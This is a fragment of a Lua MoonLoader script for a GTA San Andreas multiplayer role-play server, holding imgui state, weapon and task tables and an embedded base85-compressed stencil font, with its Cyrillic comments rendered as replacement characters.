local AutoSMG = config_ini.bools[20] == 1 and true or false
local AutoM4A1 = config_ini.bools[21] == 1 and true or false
local AutoRifle = config_ini.bools[22] == 1 and true or false
local AutoPar = config_ini.bools[23] == 1 and true or false
local AutoOt = config_ini.bools[24] == 1 and true or false
local istakesomeone = false -- ����� ���� �� ���� ���-�� �����
-- ������� ������� ��������
local needtohold = false
-- �������������� ������ ������ � ��������������
local otWeaponName = {
		{[23] = "����������� �������� \"SD Pistol\"", [24] = "�������� \"Desert Eagle\"", [25] = "�������� \"Shotgun\"", [29] = "��������-������� \"HK MP-5\"", [31] = "��������� �������� \"M4A1\"", [30] = "��������� �������� \"AK-47\"", [33] = "����������� �������� \"Country Rifle\""},
		{[25] = "��������� \"Shotgun\"", [29] = "���������-�������� \"HK MP-5\"", [31] = "��������� �������� \"M4A1\"", [30] = "��������� �������� \"AK-47\"", [33] = "����������� �������� \"Country Rifle\""}
}
local autopred = {["firstshot"] = false, ["current_weapon"] = 0}
local crosMode2 = false
-- �������
local isDialogActiveNow = false -- ����� ������� �� � ������ ������ ������
local IsAppear = false -- ����� ������ �� ������ �������
local DialogTitle = ""
local DialogText = ""
local DialogButton1 = ""
local DialogButton2 = ""
local isCorrectClose = false -- ����� ��������� �� ��� ������ ������
local SelectedButton = 0 -- ����� ������ (1 ��� 2) ���� ������
local returnWalue = nil
-- List
local show_dialog_list = imgui.ImBool(false)
local ChoosenRow = -1
local SelectedRow = 0
local StrCol = 0
-- Input
local show_dialog_input = imgui.ImBool(false)
local IsFocused = false -- ����� ��� �� ��������� ����� �� �����
local moonimgui_text_buffer = imgui.ImBuffer(256)
-- msgbox
local show_dialog_msgbox = imgui.ImBool(false)
-- ����������� ����������
local lastKV = {m = "none", b = "none"}
local lastID = {e = "none"}
local RKTimerTickCount
local BKTimerTickCount
local CTaskArr = {
	[1] = {}, -- ID �������
	-- 1 - ���, 2 - ���������, 3 - ������ 7 �� ��� ����� � ���� (�������� ��������� �� ������� � �������); 4 - ������� � ���� ���; 5 - ���� �������� ���������� �� ��, 6 - �������� ��������, 8 - /repairkit, 9 - ���� �������� 10 - ������� �������, 11 - ������ ��������
	[2] = {}, -- ����� ������ �������
	[3] = {}, -- ���. ���������� ��� �������
	["CurrentID"] = 0, 
	["n"] = {
		[1] = "{FF0000}SOS", 
		[2] = "{00FF00}���������", 
		[3] = "{59a655}������ ������� 7",
		[4] = "{00FF00}������������� ���",
		[5] = "{00FF00}����" .. RP .. " ��������",
		[6] = "{00FF00}������" .. RP .. " �������� � �����",
		[7] = "{00FF00}������������ �� ������",
		[8] = "{FF0000}���. ��������",
		[9] = "{00FF00}����" .. RP .. " ��������",
		[10] = "{00FF00}������� �������",
		[11] = "{00FF00}������" .. RP .. " ��������",
	}, -- ����� �������� � �� �� ID �������
	["nn"] = {1, 2, 4, 7, 10}, -- ID's ������� ������� ����������� ��� ���������� (�� ������� �3) � ������� ��
	[10] = { -- ������ �������� ��� ������ �� (������� ����������)
		[1]	= "", -- ������� ���������� ����� �� SOS (��� ID �10)
		[2] = {[1] = {[1] = 0, [2] = 0, [3] = 0}, [2] = false}, -- ������ ��� �� �5 (1 - ������ � ������� {1 - ������� ������, 2 - ��������� ������, 3 - �� ���������� � �������}, 2 - ���������� �� �� � ���������)
		[3] = 0, -- ������� �� ��������� ������ ������� (ID 7)
		[4] = false, -- ��� �� ������� ���� �� ������ (�� �10)
		[5] = false, -- ���� �� �������� ������� �� id 8 �� ������ ������
		[6] = false, -- id 9 - ����� ���������� �� �� � ���������
	}
}
local imCStatus = "{FFFAFA}�������� �������"
-- ��������� �����
local lastrand = 0
-- ������
local isth = false
local issquadactive = {[1] = false, [2] = false, [3] = 0}
local isglory = false
local PICKUP_POOL
local isSending = false
local skipd = {
	[1] = { -- ���������� � ��������� �������� ������
		["pid"] = -1, 
		["obool"] = true
	}, 
	
	[2] = { -- id's ����� ���������� � �������
		[1] = 0, -- ���������� �� print �����
		[2] = 0, -- 1 ���� �������
		[3] = 0, -- 2 ���� �������
		[4] = 0, -- 3 ���� �������
		[5] = 0, -- �� (������)
		[6] = 0, -- �� (����� � �������)
		[7] = 0, -- ���� � ��
		[8] = 0, -- ����� �� ��
		[9] = 0, 
		[10] = 0, 
		[11] = 0, 
		[12] = 0,
		[13] = 0, 
		[14] = 0, 
		[15] = 0, 
		[16] = 0, 
		[17] = 0, 
		[18] = 0,
		[19] = 0, 
		[20] = 0, 
		[21] = 0, 
		[22] = 0, 
		[23] = 0, 
		[24] = 0,
		[25] = 0, 
		[26] = 0, 
		[27] = 0, 
		[28] = 0, 
		[29] = 0, 
		[30] = 0,

	}, 
		
	[3] = { -- ���. ����������
		[1] = false, -- ���� �� ������� ������ (��� ��������������� ����� ����������� �������)
		[2] = 0, -- ������ ����������� � 24/7 (0 - �� ����������/������� �����, 1 - ������� �����, 2 - ������� ������/������� �� �����, 3 - ������ ��� �������)
		[3] = false, -- ��� �� ����� �� /carm (��� �������� ���������� �������)
		[4] = 0, -- ���������� ���������� � ���������
		[5] = false, -- ��� �� ������ /carm ���� �����������
		[6] = { -- ���������� �������
			["LSPD"] = 0, 
			["SFPD"] = 0,
			["LVPD"] = 0, 
			["FBI"] = 0, 
			["SFA"] = 0
		},
		[7] = {[1] = false, [2] = 0}, -- ���������� �� ����� � ��� (��� ����� �������������� �������� �� ���); 2 - �� 3� ������ ��������
		[8] = { -- ������ ��� ��������������� /carm
			[1] = false, -- ��� �� ������ /carm �������� (���� ������� �� ����� ���)
			[2] = false, -- ������ �� �������� � ������� �������������� ���������
			[3] = {[1] = {["x1"] = 322, ["y1"] = 1918, ["x2"] = 344, ["y2"] = 1979}, [2] = {["x1"] = 2211, ["y1"] = 2444, ["x2"] = 2250, ["y2"] = 2506}, [3] = {["x1"] = 1515, ["y1"] = -1667, ["x2"] = 1535, ["y2"] = -1586}, [4] = {["x1"] = -1722, ["y1"] = 672, ["x2"] = -1696, ["y2"] = 723}, [5] = {["x1"] = -1491, ["y1"] = 325, ["x2"] = -1543, ["y2"] = 386}, [6] = {["x1"] = -2467, ["y1"] = 457, ["x2"] = -2389, ["y2"] = 528}},
			-- 1 LVA 2 LVPD 3 LSPD 4 SFPD 5 SFA 6 FBI
			-- ���������� �������� �������������� ���������
			[4] = {}, -- ��������� ������
		},
	}
}

local lastTargetID = -1
local lastcarhandle = nil
local spsyns = {
	["car"] = nil, -- ����� ������� ������
	["mode"] = false, -- ����� �������������
	["changespeed"] = false, -- ����� �� �������� �������� � ���������� ������
	["tarspeed"] = 0, -- ������� ��������
	["firstshow"] = false, -- ���� �� ������������� �������� ������ ���
	["fcoord"] = {}, -- ������ ����������
	["scoord"] = {}, -- ������ ����������
	["time"] = 0, -- ����� ������ ���������� �������
}

local lastcolorchane = false -- ���� �� ��������� ����� ���� � ������ ������ (��� ����� �� �������������� ����� �����)
local soptlist = {{}, {}}
local otmmode = false
local onlinearr = {}
local preparecomplete = false
local isobnova = false
local freereq = true
local req_index = 0
local memb_ini = inicfg.load({players = {}}, "members")
local refmem1 = {["status"] = false, ["text"] = ""}
local moderpas = ""
local afkstatus = false
local needtosave = false
local keybbb = {KeyboardLayoutName = ffi.new("char[?]", 32), LocalInfo = ffi.new("char[?]", 32)}
local needtoreset = false
local delay = 1000 -- �������� ����� ����������� � ��
local style = imgui.GetStyle()
local colors = style.Colors
local clr = imgui.Col
local ImVec4 = imgui.ImVec4
local imfonts = {mainfont = nil, exFontl = nil, exFont = nil, exFontsquad = nil, font500 = nil, fontmoney = nil}
local clists = {
	[16777215] = 0,    [2852758528] = 1,  [2857893711] = 2,  [2857434774] = 3,  [2855182459] = 4, [2863589376] = 5, 
	[2854722334] = 6,  [2858002005] = 7,  [2868839942] = 8,  [2868810859] = 9,  [2868137984] = 10, 
	[2864613889] = 11, [2863857664] = 12, [2862896983] = 13, [2868880928] = 14, [2868784214] = 15, 
	[2868878774] = 16, [2853375487] = 17, [2853039615] = 18, [2853411820] = 19, [2855313575] = 20, 
	[2853260657] = 21, [2861962751] = 22, [2865042943] = 23, [2860620717] = 24, [2868895268] = 25, 
	[2868899466] = 26, [2868167680] = 27, [2868164608] = 28, [2864298240] = 29, [2863640495] = 30, 
	[2864232118] = 31, [2855811128] = 32, [2866272215] = 33,
}

local ranksnames = {[1] = "�������", [2] = "��������", [3] = "��.�������", [4] = "�������", [5] = "��.�������", [6] = "��������", [7] = "���������", [8] = "��.���������", [9] = "���������", [10] = "��.���������", [11] = "�������", [12] = "�����", [13] = "������������", [14] = "���������", [15] = "�������"}
local duel = {
	["mode"] = false, 

	["en"] = {
		["id"] = -1, 
		["hp"] = 0, 
		["arm"] = 0
	}, 
	
	["fightmode"] = false, 
	
	["my"] = {
		["hp"] = 0, 
		["arm"] = 0
	}
}

local stroyarr = {
	stroymode = false,
	soptlist = {["ruk"] = {}, ["osn"] = {}, ["stj"] = {}},
	stroypr = {
		["ids"] = {}, 
		["zv"] = {}, 
		["index"] = {
			["ruk"] = {["first"] = 0, ["last"] = 0}, 
			["osn"] = {["first"] = 0, ["last"] = 0}, 
			["stj"] = {["first"] = 0, ["last"] = 0}
		}
	},
	
	stroystate = 0,
	stroyleader = {["current"] = "", ["temp"] = ""},
	stroycreator = false,
	creator = {["id"] = 0, ["zv"] = 0},
	listcomplete = false,
	listfinal = false
}


function apply_custom_styles()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

	imgui.GetIO().Fonts:Clear()
	imfonts.mainfont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 14.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.memfont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 20.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFontl = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 20.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 28.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFontsquad = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\trebuc.ttf', squadsize, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) --trebuchet
	imfonts.font500 = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 54, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 
	--imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\stencil.ttf', 48, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())   
	--imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(ttf1_data, 48, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 

	-- File: 'STENCIL.ttf' (55596 bytes)
	-- Exported using binary_to_compressed_lua.cpp
		local result_compressed_data_base85 = "7])#######)$3F1'/###SL?>#0C/2'Ql#v#aHdd=HC1f/PH)##8m%##b2xe=j7EC&S7'##$7`'/1WA0Fflaf+5&(##8E&##%g4'IY-j+rMC$##EIh--'%HkEC^'o'Swf-6hl###+#?UCj?-xD2+Sk+P=r-$f'TqL<'2-Mq`,R<>M[w'E3n0FvTrs?cu#F7r8'##M)xhFG:nGQ=+.e-[T*F.BHZ=B7OZiKRwE_&-1o92;4^=BVcSxo*4[w'Y7)##elFiFs[[p[eH*##w(v9),wEfGY.OYAVE1R<9%/d*^.>C#k(:^')rss'^PZS%Y9w0#M?B[rQ_Nj0lt#mIcM2rdYfk293e;s%baHb%*46Z$#Fa-?@'Esup<Gj%*NM.M<8T;-#Tp01KMg2#K@U/#+/5##CwlhLxS=L#tE,h1)MC;$$7B2#2fLZ#?Z+oL57GcM#g'#G#*n.h+`_;$FtsT%Y74,MV7,,MWW:&4BJOD-.[6;-nOa>>&:cuYRCf]47,LkFn2Am0p@[@'sQYt(uQj-$D9n;%[A[R*^(D'Sw?k_&)KC_&(Uk_&*NC_&/kk_&XIjl&l)l_&8l4R*a2#v#'tH#$:>Pp&'WY_&+QC_&+/j.L.=?v$pA@>Q/FZ;%&Y12U0OvV%*q9>Z1X;s%/k^DOr<o_&VOJM'Q-k_&(HC_&)Xk_&)KC_&7-l_&*NC_&EWl_&eaZ`*4,m_&8l4R*lum_&Y@35&ZIn_&%VH5/ehn_&#G-5/80p_&0]b(N_Mq_&%P-5/,eAN-n1H-.`qhXM=_YgLfm=X$0nG<-@_`=-@nG<-6lG<-LnG<-8x(t-@UA_M99MhLh#PX$gnG<-e84gM:F`hLgvXt$:_`=->x(t-%eHIM?^.iLejFt$JlG<-[Qx>-XlG<-^Qx>-ilG<-GlG<-ulG<-qD:@-+mG<-UlG<-8jG<-/k]j--WY_&X7mEeA:PR*k[BR*>$#Ra@2q&9%CVE-W[FC5Y'QA>qb/@-u<4GH3rI+HMLLd2ZiudG1dFrCkZRdFTX0@-^meF-$'4RDHHi]G)>2eG<QCq1jrpKFY(aL='DvlE5qL@')j0^>FverL=c'g2?X*.NYgo(<Z$EYGG/w1Bqvf'&+=XoIA15JCQF-AF=er-$=2,a==$*F.nMs.CG8k^G%*KMTCO[c`l:q-$lL`f_m<dl8bUNe-k'q=Yu>Yc25>5L#Vrd'&F`2A=Su_f1u)sc<RH[>HlZ/F%'+auGns-A0,Tn3+qUDYGVM+#H/4tiCWcn>-t,CR3xw5F7SS7qVhYi34`BA_/k]4GD6LA_8;T*eZ<Un-$.R]rH/(=2CQZoKY<VQ9`Pk@_/Z:f?KjMo+DVUb-6-;sE@g>4A'd_-@9ooi34sUBe6iF_j152v(3[`FgM@:V'#p^X7/T5o-#m#[QMt3oiLr#JQMJLG&#G`Y-MHLG&#R4S>-EG5-M_e=rLr3oiLH'crLWTxqLna4rL(9m<-[_Xv-0aErL2*8qLK:SqLdK_SMKF'C-Et%'.*aErL0@]qL,6JqLc?1sLL%m.#=7PDF5.]PBKJ^VI*$/j1vpvf;H)=#H#9g'&.FpQWD;d'&*E>R<7RNe$G^(@'bN7kOOO)F./=9qVw8*aF@vp92ua&:;m=t-6quOcD>[XMCO,^q)-V$<-g2RA-o^4?-HoM>McxXrL*eov7r3XMCsHB2C#39?%AcV6MWLKC-;v#=M06:SM86T-#QNJF-nYkR-pvQx--*IqLnGG&#h)J>HfH_w08]sE@,Rx7I9A%mBY2NDFSb'X_wvsQj(.auG3TTwBK,@X(AQ:@')udxFP@268)plcE@/aw0xpJq;0'I-Z7:IP/gavS/E%43./aqpLF.Yc-4Sm--=r/F@,/a>-WR]MCG&F>H:Ih]GZFP50[6;XUQo8)Fc].:;BMOk+KN8VQ:ShSMWN4RMM/lrLdlrpL3[4?-m7R78nX*#HW:9q`Ko`PBp.ePB?i,j14qgS8MjMDF:hpfDl?pMC>4a'Jf`Ik49AEdXaE0)&UT_>-kZ4XC-+X9VlMQq23_e;-6194M5i0h$c7+gDPanI-3'b;Mf4urLnAg-#kGJF-Ka+p7aZ9/Di/ZMC.Epk+-R'EPdFB-#v9q'#:`($#-#krLd3v.#e,KkLhT`/#M?<j1,1R9`-+exFJ3*j1]2xc<g+aMC:ZxP_2@=3N<*B-#7EDU%S%f?K%vgERd)q92?F;p7(qlcE:7A5B,]ODFRs2)FkTw2;V(B-#.o`^%3-(mBo<n'A[Y+#H<U$^Gq-G_Atu#<-><>D9I8.`&>+J3b?euj;G*/>-*sE(On?bD9Pt@5B;NC2Coij3=-bXoIL<[?$%&N@$iUlB$^Ag;-,LM.M@`4rLTOUK-f&831PAU/#>*]-#Vmk.#%5u(.8)trLE-lrLH@N79,pxF.q3n0#H2>>#$ck&#:%vu#,.CB#>,>>#oU]U)%lB#$Qn0I$Pd5Q8'>uu#4b[o1n(Y7:IZGJ4a8=61ar)9/qefQ06uc7K6[.d==R<T%ME#n&^8`0(n+FI)(u,c*8hi%,e,HnC>a^REkK,:A?/e1#O;oVR6xOkPcJ@fQ,7l;H&l5&T5UV#UFEf?UY]dqWBf*52oW>)@gfhc?8Nk,-S#$tK;^9rM0Dp_J;Ym.-B6]PLn4OaI3Iu@$Zm?L-aZ+b5Ig^)?I%8%CY')*#X6rX@@]7DStnG&T7kIZUYBO9W-8N`E2ptRD6%AfGBWCv#TM>n%O@HS70%RS%PqPrZdwm@k<dT]=T6FSI+Fbuc$_e%kq2nJ)FBx],VMQ8/#-s]53&Hv-9v:^#'5Fm'87?g)JN4^,0SV2:-OnMCi6W:vCDs?-u>3S[h9Nxk-0dlA-mT]c=e>Ji(=/0)B*A&,15CX:Vt[Y:.8hX:xdWX:&K)i#'0q^ueQMOuvbAxt1]thMN57'lH^c(#=rnok*[eKk,L'MktQ0MkPQg@k@)GIk.2RCkruQ5#n3#F#IEbA#(qN+.,mU&N*8$##BBt'&7kMW#9>.bM9rA,M<+gcM[LpgLaZW-$]i1A=Pl_f1)V:G;hMx.:h(Q`<Ze8A4Ecv(3>)(/1k'MS.o?.5/sWel/wpEM0,s:D3-4o1KOK5MK`xL]=.iqr$2+RS%6C35&:[jl&>tJM'B6,/(FNcf(JgCG)N)%)*RA[`*VY<A+Zrsx+_4TY,)HRfCJmd(Nm02DE?5*<-_RE1#cea1#e=N)#*3h'#<M6(#:K5+#T5C/#pVs)#Bkeh%J10>>I/6]bR2o(E_Jdr?WSq@bp5IS7]&6Yc+e187A-@YPEK<VQCKWrQe_lr-Mv8SRMps7RUPPlSUJ5PSf=MiT`7.JUdU*GV0Fo=c=IxCWk-B`WUw*Vmb^*j6gUYf6]TX4#vv%5#$-85#(9J5#,E]5#0Qo5#4^+6#8j=6#<vO6#@,c6#D8u6#HD17#LPC7#P]U7#$P`S%eQ4]kOr4GDThDYGXhdxFdk]o@eEPY5B:ku5l.6D<2;FP8DlV`3H>'##()lL#d:3Q#s-q^#$D,J$:XKY$<I?(%:l8i%=Xpq%D8I<&o#q''lg,;'<lx&(GbwD(nh&Q(siEA)Ht8q)j=w<*&YtM*UKN9+URhZ+qln1,c,wW,mSTb,_.V4-bDx=-3TBJ-rH3]-r?j5.ArgN.Oe-`.a*8*/%@dK/&#ZC/Qexi/VnQ[/vDR10Gf5G0/_cv0EfY_1>0,V1;b(s1;,572-QJQ2q0S*3J/Fu3:nrh3l%sP4Wl0_4iI@=5O.p^5^3)h596k:6$sd)6o7uR6uXsE6J$bq6@bl(7D>hG7i;dS7(%wd746>$8aXL88;%3E8-BDl8dJwp8(G`L9t`M99Z:Vh9rs2*:F^^v9s7&#:IhC%:vAb':Lr)*:#LG,:P/+J:&V-1:R0K3:)ai5:U:18:,kN::YM2X:1+Vd:UAX+;uC$h:?Oai:`ZGk:*g.m:Jrkn:k'Rp:539r:U>vs:vI]u:@UCw:aa*#;,v,@;?gM];W0-)<jGK$=,V%m<GNU<=N(=+=P?f:=0^:D=474N=_`Wu=1^Jf=&wtr=0ph%>Rgd1>YBhS>P(bB>VZZL><@4R>4%r%#q;'w#+>P>#$####1F[S..D&%#hDNfLaiZ>>?b(igj6dl867G&#%cb&#Tx*GMLc8Gr.#R8@'PXVZ,plG2*E28]QhfcNs%a,s]sk5&eOD/1qN$j:.<8bk'&kP8kPAm8wjlPA8:X,)bCeG*E+b#-E.%mSik)TJ3<^`a`15/E=((/h,m4sQwe6AkV$puc_WbG2^#u5&oU`p%)/Gk4=xK?$)d3=$F=:pLTxSD$Be;@$VBnqLSM&D$rFvtLo;TnLUh?lL^h?lL-``pL&dbH$^v[L$VK*rLwo:^#ttRRNld5vc,6qYZ2o&,MLHB5#pHF4OR;=P]FLk-$rZ+oL,g>oLw7MlMZ.m+`[9u-$q.j1K%####a`D-dH#,##=-xF`V3P)OA.EfU+Mvv?H&V]4avlx4DIaSA]lnqfD+nx=nIix=O</20h.Y=uBoi=c.Ewf;/L2<%lK^u$50fu-VG6IM5VK5#)^q/#w(.m/)P.%#A8`$#atI$6M#R4f`uQM'(rRM'i>M.q%+YuY::$)Eq_(/:GcUPK6pfGaLb'SexOX&#5?cw'cR:kO1S*8n81&8nckaw';lPJh(&u-$ViGlL2(2'#K:PwLuLH)M3-;hLw=a*MxZ2xL83mdPTc<uLA^41#_R=gLo?b'M6tVxL%Ef0#/L/(MfD?)MF4%&M<d7iL'Pr'#nWqhL+<oNS;a'H87HPF%v5_'#b5T;-B#G58,SK/)(Bk;-/xu8.)/P^$3IZ?$L'@W$U?@`$N3P=8JI-`#xJUn#fdub#aQuB$bpn-%L7'[M2VU2##VJCM3g=D<l#<`s$&H;@6t1)Fw`K>?:7`Db5qeV$K2w.iXPq]5C7g;.wWC9r5vic)#Zk]>7XtQBIf9DEp5_`3BF.s$j'(m9r2o`=sahq8`nwl&C=v+;J,*2Bs<OD3k1LMUpkM,W'ws=l0x4F%`#vY>^3[Y#XIVS%n#6Z$&6>##:EAW7=f$s$6lCv#-fhV$.]qr$Fp/@6%s92Mu/#,2[75djnHAX-6pk-$e^=p88$^>>h>VB$vOQ(#oGj>$w3n'6sVH(#l5w01d;Y^,<[2D+#s%l'D.;?#Ymq02-Vj-$Jpx0#k:)222#i3(QmOQ#$&###7h8/fT;mQ&Y<o8+ub%T%t9:02Gw7D+fRaR6K/=A#I/IL(6IIn]D46##-snh((_cQ#pnSfLQCi-M#Lm0)D7JC#s%^F*p&PA#;^9Z-*W8f3%IuD#h:AC#]nF%$J[7s$m#YA#8alk0FEMiL1eSg4v*Oul$W2)*^:lv,I0?bu-=u2(g0]w#G@Tv+r(&I3;3J>.]Ks4/vUjT/igOX$RW3+-f^gQ&HGhC,s`rk'ir@L(<n`,$fxjSugC[:7+@e9.W*/A,)@))+Y&?wTOq%##D2Z>>50o(<7xFa'cT@b1KM1@6RU1X[%9$6#<*A3k%r;&6tNWJ:ehaR6H%X>-Mk?S^pv0u$E^L0(.KM7cG_m)9dvnO(Zrm:]5L2kLZfLd8m0i3(`1M7#]Vgl8*[v%+N$(,)GM?/fL=A2)1CP>#'/nu[/#1@6=3%[#IA3I)7ORn]6*<r71'#X7Hanf3MvCY$xDEjLa'Z@5k^kV8J4j3=f7JC#E8Uv-?D,c4RP,G4pFxU/ooXjLvr&J3.sA+*&S'f)J=Rs$#xdLMwG8f3_BZ8/R.2t-M$bINc)E.3K?@v$*lH#Y12Ol8[:sp/b*Km&bL_W-[^/E++<Y;BSdfTKN1SEIWEJX-/9Tn/R$iN(]dlf(E7fq/+FHj4Jw,V/4`gIt,+d40I_Ep%C0YonebRW$($A*+hZTr(nqRBPd0933ubfJ(9pa'mbO5i(Nl'+$+aqH27'+p+GSK+*u+gs0RX&tJ?v:'#OI)20wR#dD]Q_`*JE[i9n.T#)jd52'J^ZD*io[)0VwfG2QY1@6;$i;$`RaR6Ek%D+_a_&4_tx4(HmOQ#>),##sMataE[M>#8#m6<@#4I)f(12)r)j97;g387f[,q&7oCZ#6$(,)KVdG*nlK02I0O?#iSu=$lsS&Zw&uU%$#7B#f1i>70sh3(S9JC#]ghc)tL0+*qSID*Rx;9/KJ=l(x]DD3Wex<(%_D.3x9%J3<)]L(hCh8.lxt/MxX7C#jK7lLNY&,M2]AU)?@i?#iSk`5$L3U.i@O]KA%wh<W*Rn2J8pO(ia5n&9rki(,Ui@,+alk0I#=U0>tp3:qUp+*,cUH4g0=#GLp^i<)P#I*8mRL(`p4b?c10gS@82<BAfNa%)(6C+=E=#-h1'k(rtsG<if*s/e-0OJ25'5BhmBV.xBpN4=:)58O=8=%A[#&+>/t:QuFC-2&/M98@ki8]<RL3(XatMi<+>Z2>Itaa9F'jLUDb1^7B./&tHn58'QfP^@8ct76ZT/)=xc<-hDlD%ekS['nbRH+tZNp+W/QI8d;<v6B#Jn$PkRP/>;gF4rqOJ(cl`$'pl^I*:lUP/UUI8%5.Y)4,==v68jS[)WZH4'x-Ku.uWiJ5qG^%9Cl&[-6=668&@a#5VU+d)#:<D+X_sM'Y8icRhoBxb7;ncEj='+*_;G##$H:;$A4),#bWt&#Q1g*#M[`3']Wk5,;D#W-cA1I$][_32,7cw$?)Zr.iRaR6T>hg2`oH#6<uGd=H7GS7wqA*##cC`+YIR9.511qeV%DW-]9pd+k2ZQ#o,To8`?nB5dh='47*V.3QV[Z$v.E01K.H89tr+@5=]N_#pV@g+5?QJ(-<Tv-Jc7C#6E*H=]2E.3C^WbNk0778#=kM(E4bU%JHx7R*VbI)[/$gHRD/8'($f=-h_1%,n;;K(%2(E>oSgI*x<2%,im-R*^tN+V77m$,r#$?u>,*88b'*)+6LpFM_dOY-@^X:Q8kYs.Ng1B-.#D^uq6>##$H:;$24),#'^Q(#gn3*]dnja,/$BZ7Aa$6#+I3'kmN`d3K]Ps-Q6=mL,27-/4&ak'>5m#[qb0E'Vt4$c/a?W&wW75/prgo.4Td*&O0'B)UrY3'+S/8^@1dY#Uf3I)g1LM)m`8V.YGCp.wxd`35[*QLC<UE#?gBZ7Q0+QL?'&N6c1<j0n&PA#$DXI)]AqB#iqd58/3&NMd;eR**n0v';@KK2IDQw-Yh3?[$<T@#Sp9J),HqH2h_K<91nWu7IYdk(ch,ft$[$7&jg401Ib;39m*7_urSqf)2W$G,&oQ>u=#er7.x&%'&PGQUlxVj$UYI%#Qnl+#qHn-2kok,2hCD>#FOY8/Re/g1iX2@6C2cJ(Ut8;]RDb/Mr'*^6?df87TJY5(RNOv;S=^I]e(vP(WBIp410M7#Bgh32.,0&+Ok[W-e%#3`6N'n/toC9/vFK58vrJW7U%qo.:;ET^#,nQ#>x4%$*%(,)A=Y@5]F-d4srh/.2j0Q,^'ml$wM[L(&i^F*o_$q$6W8f3/V>c4gp].*a^D.3e+3Ec)s>t$xhH>#4nFNDbV]+445:m8T=KZ-?DXI)$BLV%eR78@mqfN0d-4hDH+SuS4`MZ/,N0+-pO,C+.C?G*I2ao&#[t50+fR#0HiR1MD/<8&XN5N')Rl316U*V1*)OI)hm@iF`pU4AJPxL('8*U.HCCqjM9n<A?-k&F/5:R'8<Sx,ddJT;;>NuRV`)bt`lOi*vZ<D%CrWJ2+kUN(G*gm&IRv(+'s.P'j,G&#7;x-#&7xh$LqB'#NLY/]c.1@6wm'f)x`H.2)p0G4m1+*0PJ(v#3Xs'kTY+4;.SaR6FPb#75?jE4_ka20)NQc*Xp:0(,::L#Pqd.=qVST0jBLV%;IM7cQ]&t-6d=#-CI[s$qRSh('?%12q5X?#.tgv7D9B6&h%O$%F.1qe3Z#0)5Po],_[Cd--HV6NE%q71W:V9.(FVB#M)j5^&b=x#1Wx?9i`nc)oc<H=]8ZQ#R(7##d>>d$IH+,;<NE4+i7JC#v9Q12_V8f3_ffG30qB:%?1[s$#xDb5DS_;.C7[=7KJ+P(OEq,Fm(I]-F:F44gr$Ak*@Q8/D&Dc`(xiZ-_7lZ,'UXe+sh?P9*K*GW:v2V(37SU+xWSA,x=`m9rKVl]&@pm&4nY70Rb0d2)0`r&E'D*4ETqQ&6vi4fLgUdFgNuR0&#s#5MN$.6M:?>#vp%##Z*b>>]b=PAs=:-2[cMW.YRaR6sWkI)7Fsl&,%/Q/RnuB,%`LS.tIi5/J:KA+WB3r74Jm0)_RZ_#n`H.2;Fwo.,F6&%LXn3^mXbE*&LNW-+l[$7XTG=(x)E.3*xPx%HXn8.ofPVHo<bh:/s)/m2co%uO1/V%PIZY#^4rUmA2vY>+DNY5+Pi5#Mc`s.^a0Q,Pqs-]G66$c7F:I$FcI['hTV3(T)lQ#TM^o8t@]T&*oIJ1VI$m8vHAt[fKtaaR5kl&)oBj25qlv.cP&J3uM5J*WM7pp_/6N'AO:T/I_[1Md1Jd)Jc7C#He3iMHBo8%7#v,*DN;fq/0Uh$JDFiL0mLD-Nt8Y[r8W<%QQbt$>;>9;2b,-?4:oB,oiG>#9kXWmuP7Z%*?4b+DPC;$5[cQ'm%@(u%)]T1'ivc$UAMO'u$0S)Piq9;tT^M=--Xd*E->j's=BP8Lnk&YT](/1ltq7R?%NY-YlH2rP8AW&vHNi<rC2)5`6Ch;;T,123nq022SO8(;W$<&#ux+#UO<6/7f$B)F.c98i@)s[FUx),vDQQ#4qP]4>%,@50.3:8dP:$-dCXI)oS]Y,e/:h$a2Cv-?D,c4#IIf3/?l'&s,]+4Xf@C#`SuD4@V)u75L)<%h$6AO5lJV%^8H8/45LJ#7MKf)B0F-;w%;T/q'&@#0o5@,m#3)+72aO'wijB.$o3]-L=&;8iOBQC4^.)$Jp:T-]R[W$Fc6`,'THR&`Va&+R.Nu.m,u%='o=J2l$%X-$](w,;xXe)p_@/;%/5##$H:;$l3),#(dZ(#^K;n&v9i84vf2;]elD0(le.H/h)g,X0<Tm,2htaaK)lQ#5MPmU./+qe6KXc;'Fc)4DvQQ#2rv8.iEwo.8Rfm/c`LK2`r+@5<N&L,HTBaYR5>L:8H1a4fifQ_'(C=)<*-1.WV*J2pZYj'NPDG+ebK1(,;/5'`4u1)%AE0((<(q%kW&7/VUm%&9CO>H1n*H*c9V(E&5>##mPUV$q5),#xP?(#.2/*^Q=M?#1$$F#(e+o9Aa$6#4V2'k&T=f3#(^,22rb2(</I<3qxZW.<htaa:FI&cofOZ7'%+r.YP==$[)Gb%$R#=7jd6$c-N_v%$f@(#>r4(HXac[$8_V/2bW9s$Q`b228+%s-F<_c)^7`8.:tL?#r>(Q/iN<5/q4HP/^*?s.v0vhLq%M-4;=*Z#U;Nk+VvJM)_69$7hb-6%Dq4n/QjPJ(q?75/T0*'%B8?K)0[7x,u%7i$A;gF4twX%$MfCb9Aek,2bL_W-[Mq[u6((O1:-c9%2)<McAnc_u,[M4'xX.<.FPWm&